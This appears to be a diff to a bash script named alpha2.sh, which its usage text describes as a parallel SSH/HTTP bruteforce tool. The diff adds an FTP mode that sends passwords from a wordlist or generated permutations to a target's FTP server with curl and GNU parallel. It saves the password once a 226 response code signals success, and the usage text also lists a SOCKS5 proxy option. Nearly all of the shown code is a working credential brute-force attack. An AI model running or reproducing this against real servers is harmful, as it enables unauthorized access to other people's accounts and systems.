@@ -16,15 +16,15 @@ unset DISPLAY
 charset=({a..z} {0..9})
 
 usage() {
-echo "alpha2 parallel SSH/HTTP bruteforce tool (Marc Carlson 2023)"
+echo "alpha2 parallel SSH/HTTP/FTP bruteforce tool (Marc Carlson 2023)"
 echo "usage: ./alpha2.sh [cauptwhT] [options]"
 echo "-c  number of characters to use for password permutation"
 echo "-a  IP address of remote target"
-echo "-p  SOCKS5 proxy address"
+echo "-p  SOCKS5 proxy address. HTTP only"
 echo "-u  username to use"
 echo "-t  number of threads to use"
 echo "-w  use the wordlist instead. /path/to/list"
-echo "-T  Type of attack. SSH/HTTP or direnum"
+echo "-T  Type of attack. ssh, http, ftp or direnum"
 }
 
 SECONDS=0
@@ -70,7 +70,7 @@ echo Please indicate either the -w flag and wordlist or the -c flag and number o
 fi
 if [[ -z $type ]]
 then
-echo Please indicate the type of attack \(ssh/http or direnum\) with the -T flag && exit
+echo Please indicate the type of attack \(ssh, http, ftp or direnum\) with the -T flag && exit
 fi
 if [[ $type == "direnum" ]] && [[ $characters ]]
 then
@@ -137,6 +137,20 @@ else if ($1 =="403") { print "Exit with code 403"; exit}'} > .password
 fi
 }
 
+
+function ftp {
+if [[ $wordlist ]] && [[ -z $characters ]]
+then
+parallel -k -j $threads -q curl -s -o /dev/null -w '%{http_code} {}\n' $proxy ftp://$ip -u $user:{} :::: $wordlist |\
+awk '{if($1 == "226") {print "Found password -> " $2; exit}}' > .password
+elif [[ -z $wordlist ]] && [[ $characters ]]
+then
+permute $characters | parallel -k -j $threads -q curl -s -o /dev/null -w '%{http_code} {}\n' ftp://$ip -u $user:{} |\
+awk '{if($1 == "226") {print "Found password -> " $2; exit}}'  > .password
+fi
+}
+
+
 if [[ $type == "direnum" ]]
 then direnum
 fi
@@ -149,6 +163,12 @@ updatepid=$!
 elif [[ $type == "http" ]]
 then
 http &
+pid=$!
+update &
+updatepid=$!
+elif [[ $type == "ftp" ]]
+then
+ftp &
 pid=$!
 update &
 updatepid=$!
